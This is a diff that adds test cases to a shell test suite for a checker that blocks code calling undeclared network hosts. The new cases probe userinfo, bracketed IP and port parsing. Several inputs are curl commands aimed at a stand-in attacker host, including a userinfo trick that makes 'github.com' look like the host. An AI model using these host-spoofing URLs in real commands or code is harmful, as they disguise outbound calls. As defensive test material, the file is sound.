@@ -454,6 +454,35 @@ check "a declared host in a code span ending a sentence is fine" allow "$sample_
 check "a declared host followed by a method call is fine" allow "$sample_dir/w13.ts" \
   'const u = \x60https://user-api.erpc.global\x60.trim();'
 
+# The authority has three parts and check_url discards two of them to reach
+# the host. Each discard is where the matcher and check_url can disagree,
+# and twice a tightening of the matcher broke one without anyone noticing.
+# One case per part, in both directions.
+
+# userinfo. A colon is legal there, so a matcher that cannot cross one cuts
+# before the @ and reads the userinfo as the host.
+check "a password in userinfo does not become the host" block "$sample_dir/a1.sh" \
+  'curl "https://github.com:x@evil.example.net/x"'
+
+check "userinfo before a declared host is fine" allow "$sample_dir/a2.sh" \
+  'curl "https://u:p@user-api.erpc.global/v1"'
+
+check "an expression in userinfo does not hide the host" block "$sample_dir/a3.yml" \
+  '      - run: curl "https://${{ env.X }}@evil.example.net/v1"'
+
+# IP-literal. The brackets are terminal: anything after the ] is a new
+# token, never part of this host.
+check "a bracketed host does not absorb the next scheme" block "$sample_dir/a4.sh" \
+  'curl "https://[::1]https://evil.example.net/x"'
+
+check "a bracketed loopback with a port is fine" allow "$sample_dir/a5.ts" \
+  'let u = "https://[::1]:8899/rpc";'
+
+# port. Only a trailing run of digits is one. A colon inside an expression
+# is not, and cutting there used to mangle a declared pattern host.
+check "a colon inside an expression is not a port" allow "$sample_dir/a6.sh" \
+  'curl "https://solana-snapshot-${a:-b}.erpc.global/x"'
+
 # --- the invariant ------------------------------------------------------
 #
 # Every shape-specific case above pins one bypass. This pins the property
@@ -467,6 +496,12 @@ check "a declared host followed by a method call is fine" allow "$sample_dir/w13
 # mention a shared domain was not enough: a report about a merged host
 # interpolates that host, so the finding that proves the bug would satisfy
 # the count. Distinct markers cannot be satisfied that way.
+#
+# The assertion is that each marker appears SOMEWHERE in the output, not
+# that each is the host of its own finding. One report cannot name both
+# today, because that host would need a :// inside it and the grammar
+# forbids one -- but if a message is ever widened to quote surrounding
+# text, tighten this to match the host field of each finding.
 invariant() {
   local name="$1" content="$2"; shift 2
   local rel="$sample_dir/inv.sh" abs="$repo_root/$sample_dir/inv.sh"
